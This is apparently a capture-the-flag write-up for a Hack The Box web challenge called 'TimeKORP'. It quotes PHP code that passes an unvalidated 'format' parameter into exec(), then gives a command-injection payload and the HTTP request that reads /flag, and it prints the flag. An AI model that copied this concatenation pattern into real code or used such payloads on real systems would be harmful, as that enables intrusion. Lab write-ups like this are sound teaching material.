## Title

TimeKORP

## Description

TBD

## Solution

This challenge uses the following technologies: php and nginx
The config directory contains the nginx configuration. Bellow is nginx.conf:

```conf
http {
    server_tokens off;
    log_format docker '$remote_addr $remote_user $status "$request" "$http_referer" "$http_user_agent" ';
    access_log /dev/stdout docker;

    charset utf-8;
    keepalive_timeout 20s;
    sendfile on;
    tcp_nopush on;
    client_max_body_size 1M;

    server {
        listen 80;
        server_name _;

        index index.php;
        root /www;

        location / {
            try_files $uri $uri/ /index.php?$query_string;
            location ~ \.php$ {
                try_files $uri =404;
                fastcgi_pass unix:/run/php-fpm.sock;
                fastcgi_index index.php;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                include fastcgi_params;
            }
        }
    }
}
```

In index.php we can see that we only have one route which maps to TimeController.php.
TimeController receives a parameter called `format` through a GET request.
Then, it will use a TimeModel.php and then display the time.

```php
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

THe problem is the TimeModel, which uses a exec function:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

Since there isn't a filter or validation of the format we can try to pipe commands and try to get command injection.
The final payload is `' ; cat /flag ; #`, `'` its for ending the string, `;` its to finish the first command, `;` indicates the end of the second command and `#` its to comment the rest of the first command:

```
GET /?format='+%3b+cat+/flag+%3b+%23 HTTP/1.1
Host: 94.237.62.94:39896
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

Flag: `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}`
